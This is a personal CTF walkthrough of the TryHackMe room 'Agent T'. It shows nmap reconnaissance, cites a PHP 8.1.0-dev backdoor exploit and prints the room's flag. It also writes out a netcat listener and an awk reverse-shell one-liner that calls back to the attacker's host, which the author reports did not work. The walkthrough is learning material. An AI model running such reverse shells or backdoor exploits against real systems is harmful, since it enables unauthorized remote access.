# [Agent T](https://tryhackme.com/room/agentt)

```
export IP=10.10.97.116
```

---

## Task 1
1. What is the flag?
	a. `nmap -sV -sC -oN nmap/initial $IP`
	```
	80/tcp    open     http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
	|_http-title:  Admin Dashboard
	6004/tcp  filtered X11:4
	57797/tcp filtered unknown
	```

	b. Left off looking into the `searchsploit Bootstrap`. Check out the two .txt files in the directory.

	c. No exploits with Bootstrap 4.

	d. Googled around and found that there is a `backdoor` exploit with `PHP 8.1.0-dev`: https://www.exploit-db.com/exploits/49933.

	e. Copied and modified the exploit to the `php_8.1.0-dev_exploit.py` file.

	f. Executed it and was able to run `root` level commands. However, the shell wasn't very stable. Still, was able to find the flag @ `/flag.txt`:

	`flag{4127d0530abf16d6d23973e3df8dbecb}`

	g. After finding the flag, I went back to figure out how to stabalize the shell.

	h. I looked for python (versions 2 and 3) and netcat on the host system, but couldn't find anything that I knew could be used for a reverse shell.

	i. Googled `reverse shells` and found the GitHub page [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and began searching the host system for any of the listed binaries.

	j. Luckily, the first binary I searched for (`which awk`) got a hit and so I took the PayloadAllTheThings awk reverse shell script and modified it accordingly.

	```
	# Variables:
	export LHOST=10.6.53.245
	export LPORT=9999

	# Start netcat on local machine:
	nc -lnvp 9999

	# The reverse shell command (update the IP and port accordingly):
	awk "BEGIN {s = \"/inet/tcp/0/10.6.53.245/9999\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}" /dev/null
	```

	k. This didn't work and I ended up trying a whole lot of other reverse shells, but none of them worked :(